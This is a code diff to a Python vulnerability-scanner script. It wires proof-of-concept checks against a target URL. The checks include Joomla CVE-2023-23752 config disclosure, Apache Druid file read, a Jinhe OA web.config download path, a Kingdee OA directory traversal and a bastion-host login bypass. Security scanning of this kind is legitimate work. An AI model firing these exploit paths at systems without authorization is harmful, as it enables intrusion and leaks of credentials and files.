@@ -1,6 +1,7 @@
 from urllib.parse import urlparse, urlunparse
 
 import Bug
+from HScan.POC.金蝶OA目录遍历 import jdOA_path
 from POC import CVE_2020_27986, PocFun, checkPOC
 from POC import CNVD_2021_30167
 from POC import CVE_2021_36749
@@ -66,16 +67,23 @@ def parse_url(url):
         print_red("[!]解析URL时发生错误")
         return None
 
+err = '''
+        =======================
+            可能存在误报，请谅解
+        =======================
+'''
 
 def check_POC(in_url, timeout=6):
+    print_red(err)
     turl = parse_url(in_url)
     global check_num
     if not turl is None:
-        re = CVE_2021_36749.Apache_Druid_any_path(inurl=turl, timeout=timeout)
+        re = CVE_2021_36749.Apache_Druid_any_path(data=turl, timeout=timeout)
         re = CNVD_2021_30167.yonyou_nc(url=turl, timeout=timeout)
         re = qzbl_anylogin(url=turl, timeout=timeout)
         re = get2017Session(url=turl, timeout=timeout)
         re = getV11Session(url=turl, timeout=timeout)
+        re = jdOA_path(url=turl,timeout=timeout)
         re = checkPOC.poc_check('CVE-2023-23752',
                                 turl,
                                 '/api/index.php/v1/config/application?public=true',
@@ -102,11 +110,6 @@ def check_POC(in_url, timeout=6):
         re = checkPOC.poc_check('金和OA-C6任意文件下载',
                                 turl,
                                 '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config',
-                                timeout=timeout)
-        re = checkPOC.poc_check('金蝶OA目录遍历',
-                                turl,
-                                '/appmonitor/protected/selector/server_file/files?folder=/&suffix=',
-                                expected_keyword='total',
                                 timeout=timeout)
         re = checkPOC.poc_check('齐治堡垒机任意用户登录',
                                 turl,
